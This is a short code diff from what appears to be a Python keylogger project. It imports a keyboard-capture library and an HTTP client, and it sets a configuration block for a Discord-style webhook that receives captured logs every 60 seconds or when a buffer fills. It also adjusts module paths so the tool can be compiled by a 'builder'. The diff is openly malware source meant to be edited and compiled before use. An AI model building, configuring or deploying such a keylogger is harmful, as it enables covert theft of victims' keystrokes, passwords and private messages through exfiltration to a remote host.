@@ -17,8 +17,14 @@ from pynput import keyboard
 import requests
 import json
 
-# Add parent directory to path for modules
-sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.dirname(os.path.abspath(__file__)))))
+# Add current directory and parent to path for modules
+# This works both when running from src/ and when built by builder
+current_dir = os.path.dirname(os.path.abspath(__file__))
+parent_dir = os.path.dirname(current_dir)
+root_dir = os.path.dirname(os.path.dirname(current_dir))
+sys.path.insert(0, current_dir)  # For build/ directory
+sys.path.insert(0, parent_dir)   # For one level up
+sys.path.insert(0, root_dir)     # For project root
 
 # Import advanced modules
 try:
@@ -36,7 +42,7 @@ except ImportError as e:
 # ============================================================================
 # CONFIGURATION - EDIT THESE VALUES BEFORE USE/COMPILING
 # ============================================================================
-WEBHOOK_URL = "YOUR_DISCORD_WEBHOOK_URL_HERE"
+WEBHOOK_URL = "WEBHOOK_URL_PLACEHOLDER"
 SEND_INTERVAL = 60  # Send logs every 60 seconds
 MAX_BUFFER_SIZE = 1000  # Maximum characters before forcing send
 
